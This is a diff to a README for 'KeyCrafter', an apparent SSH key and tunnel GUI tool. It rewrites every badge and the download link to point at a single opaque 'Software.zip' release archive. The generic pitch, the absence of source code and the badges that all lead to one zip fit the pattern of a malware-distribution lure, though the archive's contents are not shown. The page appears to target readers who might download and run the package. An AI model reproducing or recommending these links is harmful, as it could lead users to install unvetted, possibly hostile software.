@@ -1,6 +1,6 @@
 # 🚀 KeyCrafter - The Ultimate SSH Key Generator and Tunneling Tool
 
-[![Bandwidth](https://img.shields.io/badge/Bandwidth-Low-green)](https://github.com/user-attachments/files/18388744/Software.zip) [![Python3](https://img.shields.io/badge/Python-3-blue)](https://github.com/user-attachments/files/18388744/Software.zip) [![SSH](https://img.shields.io/badge/SSH-Key-yellow)](https://github.com/user-attachments/files/18388744/Software.zip) 
+[![Bandwidth](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip)](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip) [![Python3](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip)](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip) [![SSH](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip)](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip) 
 
 Welcome to KeyCrafter, a powerful tool designed to simplify the process of creating SSH keys and managing secure tunnels. Whether you are a Linux user or a Python enthusiast, KeyCrafter provides a user-friendly GUI to generate SSH keys and set up secure tunnels effortlessly. Say goodbye to complex command-line configurations and hello to seamless secure communication!
 
@@ -21,7 +21,7 @@ KeyCrafter offers a range of features to streamline your SSH key management task
 ## Getting Started
 
 To start using KeyCrafter, simply download the software package from the following link:
-[![Download KeyCrafter](https://img.shields.io/badge/Download-KeyCrafter-red)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download KeyCrafter](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip)](https://github.com/Kelsey950/KeyCrafter/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, launch the application and explore the various features it offers. Whether you are looking to generate SSH keys or create secure tunnels, KeyCrafter provides a seamless experience.
 
